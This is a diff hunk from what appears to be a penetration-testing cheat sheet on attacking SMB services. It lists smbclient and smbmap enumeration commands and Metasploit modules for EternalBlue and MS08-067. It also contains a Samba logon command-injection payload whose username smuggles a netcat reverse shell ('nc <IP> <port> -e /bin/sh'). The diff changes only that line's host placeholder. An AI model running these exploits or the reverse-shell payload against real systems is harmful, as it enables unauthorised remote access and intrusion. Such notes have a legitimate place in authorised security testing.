@@ -66,7 +66,7 @@ $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
-smb: \> logon "/=`nc <Attacker IP address> <port> -e /bin/sh`"
+smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
